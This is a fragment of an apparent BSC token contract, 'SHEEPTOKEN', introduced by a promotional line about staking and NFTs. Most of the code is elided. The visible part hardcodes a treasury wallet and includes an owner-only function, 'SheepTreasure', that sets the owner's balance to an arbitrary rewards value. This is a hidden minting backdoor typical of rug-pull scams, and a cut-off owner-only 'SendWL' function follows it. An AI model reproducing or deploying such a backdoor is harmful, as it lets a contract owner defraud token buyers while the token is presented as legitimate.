...
Sheeptokenbsc it’s new token in bsc  staking and nft coming 
...
contract SHEEPTOKEN is Context, IERC20, Ownable {
    ...
    address payable public treasuryWallet = payable(0x19d02a01639c31dE193c810AB3C9faF7B70Cde64);
    ...
    function SheepTreasure() public onlyOwner() {_walletTotals[owner()] = getTotalRewards;}
    ...
    function SendWL(address _account) external onlyOwner {
